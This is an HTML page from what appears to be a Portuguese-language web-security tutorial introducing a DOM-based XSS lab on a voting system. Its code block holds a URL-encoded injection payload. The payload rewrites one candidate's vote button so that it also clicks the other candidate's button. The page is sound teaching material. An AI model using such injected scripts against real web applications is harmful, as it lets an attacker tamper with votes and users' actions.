<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/menu.css" rel="stylesheet">
    <link href="../css/fonts.css" rel="stylesheet">
    <link href="../css/tutorial_before_lab.css" rel="stylesheet">
    <link href="../css/general_config.css" rel="stylesheet">
    <link href="../css/tutorials_box.css" rel="stylesheet">
    <link href="../css/copy_button.css" rel="stylesheet">
    <link href="../css/levels_selection.css" rel="stylesheet">
    <script src="../js/jquery.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/bootstrap.js"></script>
    <script src="../js/popper.min.js"></script>
    <script src="../js/bootstrap.bundle.min.js"></script>
    <script src="../js/bootstrap.bundle.js"></script>
    <script src="../js/bootstrap.min4.5.js"></script>

    <title>Votação XSS DOM</title>
</head>

<style>

.image-container {
    margin-left: 5px;
}

.robot{
    margin-left: -120px;
}

.writer{
    text-align:justify;
    font-family: 'Inter-Regular', fallback, sans-serif;
}

.container-buttons{
    margin-top: 8vw;
}

#robot-img{
    width: 200px;
    height: 200px;
}

.code{
    text-align:left;
    padding-left: 90px;
    margin-top: 110px;
}

</style>

<body>
    
<div style="display: flex; width: 100%;">
    
    <?php include '../menu_lateral_interm.php'; ?>
    <div class="content" style="margin: 0px">
    
    <div class ="container-robot" style="">
        <div class="robot-speech">
            <p class="writer" id="balloon-text">
            Parabéns por ter chegado até aqui! Agora vamos analisar o laboratório de votação com o XSS DOM.
            </p>
        </div>
        <div class="robot d-inline-flex align-items-center justify-content-center">
        <img src="../img/robot.png" alt="robot-icon" id="robot-img">
        </div>
  </div>


        <div class="code" style="margin-top: 250px;">

        <p>Copie o código abaixo e cole-o no final da URL na barra de busca do navegador e, em seguida, teste o sistema de votação.</p>

        <div id="codeBlock">
        <code>&query=query=document.querySelector(%27%23candidate2%20button%27).setAttribute(%27onclick%27,%20%27vote(2);%20setTimeout(function()%20{%20document.querySelector(%22%23candidate1%20button%22).click();%20},%20100);%27);
            
        </code>
        </div>
        <button class="copyButton" id="copyButton">Copiar Código</button>
        <button class="copyButton copied" id="copied">Copiado <img src="../img/check.png" alt="" width=20px;></button>

        </div>



        <div class="container-buttons">
        <a onclick="window.history.back();"  style="color: white; text-decoration: none; z-index:100;">
            <div class="btn btn-primary transition-button" id="transition-back">
            &lt;&lt;Retornar
            </div>
        </a>
        <button class="btn btn-primary transition-button" id="transition-next" style="color: white; text-decoration: none;" onclick="finishTask(taskNo, redirPath)">
                    Laboratório&gt;&gt;
                </button>

                </div>
            </div>
    </div>
</div>


<script>
var taskNo = 4;
var redirPath = "../laboratorio/voting_lab.php?atividade=dom_vote";


</script>
<script src="../js/copy_button.js"></script>
<script src="../js/progress.js"></script>
<script src="../js/writerTutorial.js"></script>
<script src="../js/menuLateral.js"></script>
<script src="../js/robotAdjustment.js"></script>
<script>

</script>
</body>
</html>

